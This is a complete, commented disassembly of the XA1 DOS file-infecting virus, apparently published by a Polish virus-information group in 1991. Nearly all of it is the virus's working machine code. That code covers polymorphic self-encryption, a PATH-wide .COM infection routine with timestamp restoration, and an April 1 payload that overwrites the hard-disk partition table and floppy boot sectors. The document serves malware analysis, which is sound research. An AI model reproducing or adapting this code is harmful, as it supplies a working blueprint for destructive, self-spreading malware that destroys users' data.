;==============================================
; Virus XA1 isolated in Poland in June 1991
;
; disassembled by Andrzej Kadlof July 1991
;
; (C) Polish Section of Virus Information Bank
;==============================================

; virus entry point

0100 EB07           jmp    0109

0102 56 0A 03 59 00       ; first 7 bytes forms virus signature
0107 2A 00                ; generation counter, never used (?)

; prepare stack for tricks
; stack usage:
;  [BP + 2]  cleared but not used
;  [BP + 0]  offset in block
;  [BP - 2]  low byte of size of decrypted part and encryption key
  
0109 0E             push   cs           ; make free space on stack
010A E80000         call   010D         ; put current offset on the stack
010D FA             cli                 ; disable interrupt to safe stack
010E 8BEC           mov    bp,sp
0110 58             pop    ax
0111 32C0           xor    al,al
0113 894602         mov    [bp+02],ax   ; corrupt debbuger return address ??
0116 8146002800     add    word ptr [bp],0028 ; offset of first byte to encrypt

; encrypt virus code, this routine is changed in different virus copies

011B B9CE05         mov    cx,05CE      ; length of decrypted block
011E B08C           mov    al,8C        ; 8C is changed!
0120 8846FF         mov    [bp-01],al
0123 8B5E00         mov    bx,[bp]      ; current position in block
;      ^^  changed, possible 3 wariants:
;    ..5E..  mov  bx,[bp]  versions 0, 1, 2
;    ..76..  mov  si,[bp]  versions 3, 4, 5
;    ..7E..  mov  di,[bp]  versions 6, 7, 8

0126 884EFE         mov    [bp-02],cl   ; low byte of counter
0129 8A4EFF         mov    cl,[bp-01]   ; encrypt key
012C D207           rol    byte ptr [bx],cl  ; byte manipulation
;    ^^^^  changed, possible 9 wariants:
;    000F   add  byte ptr [bx],cl     version 0
;    300F   xor  byte ptr [bx],cl     version 1
;    D2O7   rol  byte ptr [bx],cl     version 2
;    000C   add  byte ptr [si],cl     version 3
;    300C   xor  byte ptr [si],cl     version 4
;    D204   rol  byte ptr [si],cl     version 5
;    000D   add  byte ptr [di],cl     version 6
;    300D   xor  byte ptr [di],cl     version 7
;    D205   rol  byte ptr [di],cl     version 8

012E EB00           jmp    0130         ; short pause
0130 43             inc    bx           ; position in block
;    ^^ changed, possible 3 wariants:
;    43   inc  bx     version 0, 1, 2
;    46   inc  si     version 3, 4, 5
;    47   inc  di     version 6, 7, 8

0131 8A4EFE         mov    cl,[bp-02]  ; restore block size
0134 E2F0           loop   0126        ; offset is decrypted!   

; encrypted part

0136 FB             sti

; get address of curent DTA and store it on the stack

0137 B42F           mov    ah,2F
0139 CD21           int    21
013B 06             push   es
013C 53             push   bx

; get keyboard status bits

013D 33C0           xor    ax,ax
013F 8ED8           mov    ds,ax
0141 A01704         mov    al,[0417]
0144 2410           and    al,10        ; extract scroll lock state
0146 50             push   ax           ; store
0147 80261704EF     and    byte ptr [0417],EF  ; clear scroll lock flag

; restore DS

014C 8CC8           mov    ax,cs
014E 8ED8           mov    ds,ax

; intercepte INT 24h

0150 BAC606         mov    dx,06C6
0153 B82425         mov    ax,2524      ; set interrupt vector
0156 CD21           int    21

; search for PATH= in environment block

0158 A12C00         mov    ax,[002C]    ; segment of environment block
015B 8EC0           mov    es,ax
015D 33FF           xor    di,di        ; begin of environment block
015F FC             cld

0160 26803D00       cmp    es:byte ptr [di],00  ; end of block marker
0164 741D           je     0183         ; end fo block

0166 BE1B05         mov    si,051B      ; offset of string 'PATH='
0169 B90500         mov    cx,0005      ; length of string
016C 8BC7           mov    ax,di        ; starting address
016E F3A6           rep cmpsb           ; compare
0170 7411           je     0183         ; found

0172 8BF8           mov    di,ax        ; last starting point
0174 32C0           xor    al,al
0176 B5FF           mov    ch,FF        ; maximum block size
0178 F2AE           repnz scasb
017A 74E4           je     0160

017C BF1A05         mov    di,051A      ; end of buffer for path
017F 8CC8           mov    ax,cs        ; restore ES
0181 8EC0           mov    es,ax
0183 C706C1056205   mov    word ptr [05C1],0562

; set local DTA

0189 BA3605         mov    dx,0536
018C B41A           mov    ah,1A        ; set DTA  
018E CD21           int    21

0190 A1F906         mov    ax,[06F9]
0193 A3F706         mov    [06F7],ax
0196 A1FD06         mov    ax,[06FD]
0199 A3FB06         mov    [06FB],ax
019C B90500         mov    cx,0005      ; counter of potential victims
019F BA1505         mov    dx,0515      ; '*.COM', 0
01A2 06             push   es
01A3 57             push   di
01A4 51             push   cx

01A5 8CC8           mov    ax,cs
01A7 8EC0           mov    es,ax
01A9 B9FFFF         mov    cx,FFFF      ; all possible attributes
01AC B44E           mov    ah,4E        ; find first
01AE EB06           jmp    01B6

01B0 59             pop    cx           ; restore counter
01B1 E35B           jcxz   020E         ; limit reached, check show/destruction

01B3 B44F           mov    ah,4F        ; find next
01B5 51             push   cx           ; store counter

01B6 CD21           int    21
01B8 7203           jb     01BD         ; continue

01BA E9F100         jmp    02AE

; restore address of path in environment block

01BD 59             pop    cx
01BE 5F             pop    di
01BF 07             pop    es

01C0 26803D00       cmp    es:byte ptr [di],00  ; end of block?
01C4 744A           je     0210         ; yes

; copy path to buffer

01C6 BB6205         mov    bx,0562      ; offset of  buffer

01C9 268A05         mov    al,es:[di]   ; next character
01CC 0AC0           or     al,al        ; end of block?
01CE 740A           je     01DA         ; yes

01D0 47             inc    di
01D1 3C3B           cmp    al,3B        ; ';', end of path?
01D3 7405           je     01DA         ; yes

01D5 8807           mov    [bx],al      ; copy character
01D7 43             inc    bx           ; increase pointer
01D8 EBEF           jmp    01C9         ; get next character

01DA 81FB6205       cmp    bx,0562      ; buffer not empty?
01DE 74E0           je     01C0         ; empty

01E0 8A47FF         mov    al,[bx-01]
01E3 3C3A           cmp    al,3A        ; ':', root directory
01E5 7408           je     01EF         ; yes

01E7 3C5C           cmp    al,5C        ; check last character, '\'
01E9 7404           je     01EF         ; there is

01EB C6075C         mov    byte ptr [bx],5C    ; add '\' 
01EE 43             inc    bx           ; pointer to last character
01EF 06             push   es
01F0 57             push   di
01F1 51             push   cx
01F2 891EC105       mov    [05C1],bx    ; store it
01F6 8BF3           mov    si,bx
01F8 81EB6205       sub    bx,0562      ; find path length
01FC 8BCB           mov    cx,bx
01FE BF1405         mov    di,0514      ; destination buffer
0201 8CC8           mov    ax,cs        ; restore ES
0203 8EC0           mov    es,ax
0205 4E             dec    si
0206 FD             std
0207 F3A4           rep movsb           ; copy
0209 8BD7           mov    dx,di
020B 42             inc    dx
020C EB97           jmp    01A5         ; find first

; end of infection proces, check condition for destruction/show

020E 58             pop    ax           ; balance stack
020F 58             pop    ax

0210 8CC8           mov    ax,cs        ; restore ES
0212 8EC0           mov    es,ax

; get date

0214 B42A           mov    ah,2A        ; get date
0216 CD21           int    21

0218 81FA0104       cmp    dx,0401      ; April 1?
021C 7533           jne    0251         ; no

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;  DESTRUCTION OF HARD DISK AND FLOPPIES IN A: AND B:
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><>

; copy partition table to sector 11h of side 0, track 0

021E BA8000         mov    dx,0080      ; first hard drive
0221 B90100         mov    cx,0001      ; track 0 sector 1 (partition table)
0224 BB0307         mov    bx,0703      ; destroy victim code
0227 B80102         mov    ax,0201      ; read 1 sector
022A 52             push   dx
022B 51             push   cx
022C 53             push   bx
022D CD13           int    13           ; disk I/O
022F 5B             pop    bx
0230 59             pop    cx
0231 5A             pop    dx
0232 B111           mov    cl,11        ; new place for partition table
0234 B80103         mov    ax,0301      ; write partition table
0237 CD13           int    13

; set and of sector marker in the buffer

0239 C706350855AA   mov    word ptr [0835],AA55  ; end of sector marker

; overwrite partition table

023F B280           mov    dl,80
0241 E87404         call   06B8         ; write one sector to disk

; overwrite boot sector of drive A:

0244 32D2           xor    dl,dl
0246 E86F04         call   06B8         ; write one sector do disk

; overwrite boot sector of drive B:

0249 B201           mov    dl,01
024B E86A04         call   06B8         ; write disk

024E EB0A           jmp    025A
0250 90             nop

; compare date

0251 81FA180C       cmp    dx,0C18      ; december 24?
0255 7203           jb     025A         ; date earlier

;<><><><<><><><><><><><><><><><><><><><>
;
;             CHRISTMAS SHOW
;
; see the description of subroutine 05D7
;<><><><><><><><><><><><><><><><><><><><><>

0257 E87D03         call   05D7         ; drow christmas tree

; make sound

025A E440           in     al,40
025C 3CF8           cmp    al,F8
025E 7206           jb     0266

0260 E461           in     al,61
0262 0C03           or     al,03
0264 E661           out    61,al

; restore the state of scroll lock flag

0266 33C0           xor    ax,ax
0268 8ED8           mov    ds,ax
026A 58             pop    ax
026B 08061704       or     [0417],al

; restore INT 24h

026F 2E8E1E1400     mov    ds,cs:[0014] ; segment of INT 24h in PSP
0274 2E8B161200     mov    dx,cs:[0012] ; offset of INT 24h in PSP
0279 B82425         mov    ax,2524      ; set interrupt vector
027C CD21           int    21

; restore DTA

027E 5A             pop    dx
027F 1F             pop    ds
0280 B41A           mov    ah,1A        ; set DTA
0282 CD21           int    21

; restore DS

0284 8CC8           mov    ax,cs
0286 8ED8           mov    ds,ax

0288 BEF006         mov    si,06F0
028B 8B3EF706       mov    di,[06F7]
028F 033EFB06       add    di,[06FB]
0293 57             push   di
0294 B90700         mov    cx,0007
0297 FC             cld
0298 F3A4           rep movsb
029A 33C0           xor    ax,ax
029C 8BD8           mov    bx,ax
029E 8BD0           mov    dx,ax
02A0 8BE8           mov    bp,ax

02A2 8B36F706       mov    si,[06F7]
02A6 BF0001         mov    di,0100
02A9 8B0EFB06       mov    cx,[06FB]
02AD C3             ret

02AE BE5405         mov    si,0554      ; file name in FCB
02B1 8B3EC105       mov    di,[05C1]    ; address of destination
02B5 B90D00         mov    cx,000D      ; length of asciiz string
02B8 FC             cld
02B9 F3A4           rep movsb           ; copy
02BB BF2005         mov    di,0520      ; buffer for file name
02BE E8FA01         call   04BB         ; copy
02C1 7503           jne    02C6

02C3 E9EAFE         jmp    01B0         ; find next/destruct/show

02C6 BF2B05         mov    di,052B
02C9 E8EF01         call   04BB         ; copy file name
02CC 7503           jne    02D1

02CE E9DFFE         jmp    01B0         ; find next/destruct/show

02D1 C606610500     mov    byte ptr [0561],00
02D6 90             nop
02D7 F6064B0507     test   byte ptr [054B],07  ; attribute byte in DTA
02DC 740F           je     02ED         ; hiden, system or read only, open file

02DE BA6205         mov    dx,0562      ; file name
02E1 33C9           xor    cx,cx        ; clear all attributes
02E3 B80143         mov    ax,4301      ; set file attributes
02E6 CD21           int    21
02E8 7303           jnb    02ED         ; open file

02EA E9C3FE         jmp    01B0         ; find next/destruct/show

02ED BA6205         mov    dx,0562
02F0 B8023D         mov    ax,3D02      ; open file for read/write
02F3 CD21           int    21

02F5 8BD8           mov    bx,ax        ; handle
02F7 7303           jnb    02FC

02F9 E9B4FE         jmp    01B0         ; find next

; check file size

02FC A15205         mov    ax,[0552]    ; high word of file size in DTA
02FF 0BC0           or     ax,ax
0301 7403           je     0306         ; file below 64K

0303 E99001         jmp    0496         ; close file and find next

0306 A15005         mov    ax,[0550]    ; lower word of file size
0309 3D0700         cmp    ax,0007      ; minimum file size
030C 72F5           jb     0303         ; close file and find next

030E 3D00F8         cmp    ax,F800      ; maximum file size
0311 73F0           jnb    0303         ; close file and find next

; mayby already infected?

0313 8B16F706       mov    dx,[06F7]    ; form address of bufer
0317 0316FB06       add    dx,[06FB]
031B B90700         mov    cx,0007      ; number of bytes
031E 52             push   dx
031F 51             push   cx
0320 B43F           mov    ah,3F        ; read file
0322 CD21           int    21

0324 59             pop    cx
0325 5E             pop    si
0326 7208           jb     0330         ; read error, close and find next

; compare first 7 bytes with own code

0328 BF0001         mov    di,0100      ; destination
032B FC             cld
032C F3A6           rep cmpsb
032E 7503           jne    0333

0330 E96301         jmp    0496         ; close file and find next, (infected!)

; get and store file date and time

0333 B80057         mov    ax,5700      ; get file time stamp
0336 CD21           int    21
0338 72F6           jb     0330         ; close file, find next

033A 89160107       mov    [0701],dx    ; store date
033E 890EFF06       mov    [06FF],cx    ; store time
0342 C606610501     mov    byte ptr [0561],01
0347 90             nop

; check file size, if less than 603h bytes then append some garbage

0348 A15005         mov    ax,[0550]    ; file size
034B 3D0306         cmp    ax,0603
034E 7321           jnb    0371

; file length is less than 603h, add some garbage

0350 33D2           xor    dx,dx
0352 33C9           xor    cx,cx
0354 B80242         mov    ax,4202      ; move file ptr to EOF
0357 CD21           int    21
0359 7303           jnb    035E         ; no errors, continue

035B E93801         jmp    0496         ; close file and find next

035E B90306         mov    cx,0603      ; number of bytes
0361 2B0E5005       sub    cx,[0550]    ; file size
0365 B440           mov    ah,40        ; write file
0367 CD21           int    21
0369 B80306         mov    ax,0603      ; new file size
036C 7303           jnb    0371

036E E92501         jmp    0496         ; close file and find next

; now file is at least 603h bytes long

0371 FEC4           inc    ah
0373 A3F906         mov    [06F9],ax    ; oryginal file size + 256
0376 A15005         mov    ax,[0550]    ; file size
0379 BE0306         mov    si,0603      ; virus length
037C 33FF           xor    di,di
037E 3BC6           cmp    ax,si
0380 7302           jnb    0384

0382 8BF0           mov    si,ax

0384 8936FD06       mov    [06FD],si

0388 8BD7           mov    dx,di
038A 33C9           xor    cx,cx
038C B80042         mov    ax,4200      ; move file ptr to BOF
038F CD21           int    21
0391 7303           jnb    0396

0393 E90001         jmp    0496         ; close file and find next

0396 8B16F706       mov    dx,[06F7]
039A 0316FB06       add    dx,[06FB]
039E B90002         mov    cx,0200
03A1 3BF1           cmp    si,cx
03A3 7302           jnb    03A7

03A5 8BCE           mov    cx,si        ; number of bytes

03A7 52             push   dx
03A8 51             push   cx
03A9 B43F           mov    ah,3F        ; read file
03AB CD21           int    21
03AD 59             pop    cx
03AE 5A             pop    dx
03AF 7303           jnb    03B4         ; continue

03B1 E9E200         jmp    0496         ; close file and find next

03B4 52             push   dx
03B5 51             push   cx
03B6 33D2           xor    dx,dx
03B8 33C9           xor    cx,cx
03BA B80242         mov    ax,4202      ; move file ptr to EOF
03BD CD21           int    21
03BF 59             pop    cx
03C0 5A             pop    dx
03C1 7303           jnb    03C6         ; continue

03C3 E9D000         jmp    0496         ; close file and find next

03C6 B440           mov    ah,40        ; write file
03C8 CD21           int    21
03CA 7303           jnb    03CF

03CC E9C700         jmp    0496         ; close file and find next

03CF 81C70002       add    di,0200
03D3 81EE0002       sub    si,0200
03D7 7602           jbe    03DB

03D9 EBAD           jmp    0388

03DB FF060701       inc    word ptr [0107]  ; infection counter
03DF 33D2           xor    dx,dx
03E1 33C9           xor    cx,cx
03E3 B80042         mov    ax,4200      ; move file ptr to BOF
03E6 CD21           int    21
03E8 7303           jnb    03ED

03EA E9A900         jmp    0496         ; close file and find next

03ED 53             push   bx           ; store handle
03EE E440           in     al,40
03F0 A807           test   al,07
03F2 74FA           je     03EE

03F4 A21F01         mov    [011F],al    ; change decryption key

; get random number from system timer count 

03F7 33C0           xor    ax,ax
03F9 8AF8           mov    bh,al
03FB 8ED8           mov    ds,ax
03FD A06C04         mov    al,[046C]    ; timer, low byte

0400 8CCA           mov    dx,cs        ; restore DS
0402 8EDA           mov    ds,dx

; generate rundom number in BX in the range 0..8

0404 B103           mov    cl,03
0406 F6F1           div    cl           ; AL <- AL/3, AH <- remainder
0408 8AEC           mov    ch,ah        ; store remainder (0, 1 or 2)
040A 32E4           xor    ah,ah        ; prepare division
040C F6F1           div    cl           ; AL <- AL / 9, AH <- remainder
040E 8AC4           mov    al,ah        ; AL <- second remainder
0410 02C0           add    al,al        ; *2, AL in [0..4]
0412 02C4           add    al,ah        ; *3, AL in [0..6] 
0414 02C5           add    al,ch        ; first remainder
0416 8AD8           mov    bl,al        ; BL in [0..8]

; multiply BX by 4 (table entry size)

0418 03DB           add    bx,bx
041A 03DB           add    bx,bx
041C 81C3C906       add    bx,06C9      ; offset of table

; modify encryption routine (automodyfication)

0420 8A07           mov    al,[bx]
0422 A22401         mov    [0124],al    ; 3 versions 5E/76/7E
0425 8B4701         mov    ax,[bx+01]
0428 A32C01         mov    [012C],ax    ; 9 wersions
042B 8A4703         mov    al,[bx+03]   ; 3 versions
042E A23001         mov    [0130],al
0431 8AC5           mov    al,ch

; prepare decrypt routine

0433 BBED06         mov    bx,06ED
0436 D7             xlat
0437 A26104         mov    [0461],al    ; modify decryption routine

; write new encryption routine to file

043A 5B             pop    bx           ; restore handle
043B BA0001         mov    dx,0100      ; begin of file
043E B93500         mov    cx,0035      ; block size
0441 B440           mov    ah,40        ; write file
0443 CD21           int    21
0445 724F           jb     0496         ; close file and find next

; decryption routine

0447 BE3501         mov    si,0135      ; start of decrypted block
044A B9CE05         mov    cx,05CE      ; size of decrypted block
044D 53             push   bx           ; store handle
044E 51             push   cx
044F B80002         mov    ax,0200
0452 8B1EF706       mov    bx,[06F7]
0456 031EFB06       add    bx,[06FB]
045A 53             push   bx
045B 8A0E1F01       mov    cl,[011F]    ; decription key

045F 8A2C           mov    ch,[si]
0461 D2CD           ror    ch,cl        ; <-- changed (3 variants)

;    ^^  changed byte, possible wariants:
;    28CD   sub  ch,cl   versions: 0, 3, 6
;    30CD   xor  ch,cl   versions: 1, 4, 7
;    D2CD   ror  ch,cl   versions: 2, 5, 8

0463 882F           mov    [bx],ch
0465 43             inc    bx
0466 46             inc    si
0467 48             dec    ax
0468 75F5           jne    045F

046A 5A             pop    dx
046B 59             pop    cx
046C 5B             pop    bx
046D 51             push   cx
046E 81F90102       cmp    cx,0201
0472 7203           jb     0477

0474 B90002         mov    cx,0200
0477 B440           mov    ah,40        ; write file
0479 CD21           int    21
047B 59             pop    cx
047C 7218           jb     0496         ; close file and find next

047E 81E90002       sub    cx,0200
0482 77C9           ja     044D

; restore file time stamp

0484 8B160107       mov    dx,[0701]    ; file date
0488 8B0EFF06       mov    cx,[06FF]    ; file time
048C B80157         mov    ax,5701      ; set file time stamp
048F CD21           int    21
0491 7203           jb     0496         ; close file and find next

; decrease counter on the stack

0493 59             pop    cx
0494 49             dec    cx
0495 51             push   cx

0496 B43E           mov    ah,3E        ; close file
0498 CD21           int    21
049A 8A0E4B05       mov    cl,[054B]    ; attributes
049E FE0E6105       dec    byte ptr [0561]
04A2 7405           je     04A9

04A4 F6C107         test   cl,07        ; hidden, system, read only
04A7 740F           je     04B8

04A9 80F920         cmp    cl,20        ; archive
04AC 740A           je     04B8

04AE BA6205         mov    dx,0562      ; file name
04B1 32ED           xor    ch,ch
04B3 B80143         mov    ax,4301      ; set file attributes
04B6 CD21           int    21
04B8 E9F5FC         jmp    01B0         ; find next

;----------------------------------------
; move 11 bytes do DS:DI ('C:\COMMAND.')

04BB BE6205         mov    si,0562
04BE B90B00         mov    cx,000B
04C1 FC             cld
04C2 F3A6           rep cmpsb
04C4 C3             ret

; buffer for path

04C5 30 31 32 33 34 35 36 37 01234567
04CD 38 39 30 31 32 33 34 35 89012345
04D5 36 37 38 39 30 31 32 33 67890123
04DD 34 35 36 37 38 39 30 31 45678901
04E5 32 33 34 35 36 37 38 39 23456789
04ED 30 31 32 33 34 35 36 37 01234567
04F5 38 39 30 31 32 33 34 35 89012345
04FD 36 37 38 43 3A 5C 4A 45 678C:\JE
0505 5A 59 4B 49 43 3A 5C 50 ZYKIC:\P
050D 43 44 3A 5C 55 43 3A 5C CD:\UC:\

; paterns for search

0515 2A 2E 43 4F 4D 00 50 41 *.COM PA
051D 54 48 3D                TH=

; buffers for file names

0520          49 42 4D 42 49    IBMBI
0525 4F 2E 43 4F 4D 00       O.COM

052B                   49 42       IB
052D 4D 44 4F 53 2E 43 4F 4D MDOS.COM
0535 00 

; local DTA

0536    03 3F 3F 3F 3F 3F 3F                  ;\
053D 3F 3F 43 4F 4D FF 02 00                  ; | reserved
0545 00 00 00 00 00 00                        ;/
054B 20                                       ; file attribute
054C 00 60 71 0E                              ; file time stamp
0550 DB 62 00 00                              ; file size
0554 43 4F 4D 4D 41 4E 44 2E 43 4F 4D 00 00   ; file name (COMMAND.COM, 0, 0)

0561 01                 ; flag: attributes are changed

0562                43 3A 5C      C:\
0565 43 4F 4D 4D 41 4E 44 2E COMMAND.
056D 43 4F 4D 00 00 4D 00 00 COM  M
0575 00 2E 43 4F 4D 00 4F 68  .COM Oh
057D 4E 6F 21 4F 68 4E 6F 21 No!OhNo!
0585 4F 68 4E 6F 21 4F 68 4E OhNo!OhN
058D 6F 21 4F 68 4E 6F 21 4F o!OhNo!O
0595 68 4E 6F 21 4F 68 4E 6F hNo!OhNo
059D 21 4F 68 4E 6F 21 4F 68 !OhNo!Oh
05A5 4E 6F 21 4F 68 4E 6F 21 No!OhNo!
05AD 4F 68 4E 6F 21 4F 68 4E OhNo!OhN
05B5 6F 21 4F 68 4E 6F 21 4F o!OhNo!O
05BD 68 4E 6F 21             hNo!

05C1 65 05              ;

;---------------------------------------
; write character (or space) cx times

05C3 B020           mov    al,20

05C5 50             push   ax
05C6 E89E00         call   0667         ; write character
05C9 58             pop    ax
05CA E2F9           loop   05C5
05CC C3             ret

;-------------
; next line

05CD B00D           mov    al,0D
05CF E89500         call   0667         ; write character
05D2 B00A           mov    al,0A
05D4 E99000         jmp    0667         ; write character

;------------------------------
; drow christmast tree
;
; result will look like this:
;
;
;                                        ญ
;                                       ***
;                                      *****
;                                     *******
;                                    *********
;                                   ***********
;                                  *************
;                                 ***************
;                                *****************
;                               *******************
;                              *********************
;                             ***********************
;                            *************************
;                           ***************************
;                          *****************************
;                                       ÛÛÛ
;                                       ÛÛÛ
;                                       ÛÛÛ
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;                    Und er lebt doch noch : Der Tannenbaum !
;                              Frohe Weihnachten ...
;

05D7 B92700         mov    cx,0027
05DA E8E6FF         call   05C3         ; clear 39 characters
05DD B0AD           mov    al,AD        ; 'ญ'
05DF E88500         call   0667         ; write character
05E2 E8E8FF         call   05CD         ; new line
05E5 BB0300         mov    bx,0003
05E8 BA2600         mov    dx,0026

05EB 8BCA           mov    cx,dx
05ED E8D3FF         call   05C3         ; write CX spaces
05F0 8BCB           mov    cx,bx
05F2 B02A           mov    al,2A        ; '*'
05F4 E8CEFF         call   05C5         ; write CX characters
05F7 E8D3FF         call   05CD         ; new line
05FA 4A             dec    dx
05FB 83C302         add    bx,0002
05FE 83FB1F         cmp    bx,001F
0601 75E8           jne    05EB

0603 BB0300         mov    bx,0003
0606 B92600         mov    cx,0026
0609 E8B7FF         call   05C3         ; write CX spaces
060C B90300         mov    cx,0003
060F B0DB           mov    al,DB        ; 'Û'
0611 E8B1FF         call   05C5         ; write CX characters
0614 E8B6FF         call   05CD         ; next line
0617 4B             dec    bx
0618 75EC           jne    0606

061A B95000         mov    cx,0050      ; full line
061D B0CD           mov    al,CD        ; 'อ'
061F E8A3FF         call   05C5         ; write character CX times
0622 B91300         mov    cx,0013
0625 E89BFF         call   05C3         ; write CX spaces
0628 BB7406         mov    bx,0674      ; string: Und er lebt doch ...
062B E82C00         call   065A         ; write string
062E B91D00         mov    cx,001D
0631 E88FFF         call   05C3         ; clear part of line
0634 EB24           jmp    065A         ; write asciiz string pointed by BX
0636 90             nop

0637 E80000         call   063A

063A 5B             pop    bx
063B 83C30D         add    bx,000D
063E 8CC8           mov    ax,cs
0640 8ED8           mov    ds,ax
0642 E81500         call   065A         ; write string
0645 EBFE           jmp    0645         ; hang CPU

0647 41 70 72 69 6C 2C 20 41 April, A
064F 70 72 69 6C 20 2E 2E 2E pril ...
0657 20 07 00 

;-----------------------------------
; write asciiz string pointed by BX

065A 8A07           mov    al,[bx]      ; get character
065C 43             inc    bx           ; next character
065D 0AC0           or     al,al        ; and of string?
065F 7405           je     0666         ; yes, RET

0661 E80300         call   0667         ; write character
0664 EBF4           jmp    065A         ; get next character
0666 C3             ret

;--------------------
; write character TTL

0667 52             push   dx
0668 51             push   cx
0669 53             push   bx
066A 32FF           xor    bh,bh
066C B40E           mov    ah,0E
066E CD10           int    10
0670 5B             pop    bx
0671 59             pop    cx
0671 59             pop    cx
0672 5A             pop    dx
0673 C3             ret

0674 55 6E 64 20 65 72 20 6C Und er l
067C 65 62 74 20 64 6F 63 68 ebt doch
0684 20 6E 6F 63 68 20 3A 20  noch :
068C 44 65 72 20 54 61 6E 6E Der Tann
0694 65 6E 62 61 75 6D 20 21 enbaum !
069C 0D 0A 00 46 72 6F 68 65   Frohe
06A4 20 57 65 69 68 6E 61 63  Weihnac
06AC 68 74 65 6E 20 2E 2E 2E hten ...
06B4 0D 0A 07 00

;------------------------------------------
; write one sector to disk specified in DL
; track 9, side 0 sector 1

06B8 32F6           xor    dh,dh
06BA B90100         mov    cx,0001
06BD BB3706         mov    bx,0637
06C0 B80103         mov    ax,0301
06C3 CD13           int    13
06C5 C3             ret

;==================
; INT 24h handler

06C6 B000           mov    al,00
06C8 CF             iret

; table of bytes for changing encrypt routine

06C9 5E 00 0F 43 
06CD 5E 30 0F 43
06D1 5E D2 07 43
06D5 76 00 0C 46
06D9 76 30 0C 46
06DD 76 D2 04 46
06E1 7E 00 0D 47
06E5 7E 30 0D 47
06E9 7E D2 05 47

; table for variants of decrypt routine

06ED 28 30 D2

; part of victime code

06F0 F3A4           rep movsb
06F2 8BF1           mov    si,cx
06F4 8BF9           mov    di,cx
06F6 C3             ret

06F7 0307               ; offset of buffer/modified code
06F9 DB63               ; file size + 256
06FB C603               ;
06FD 0306               ;
06FF 0060               ; file date
0701 710E               ; file time

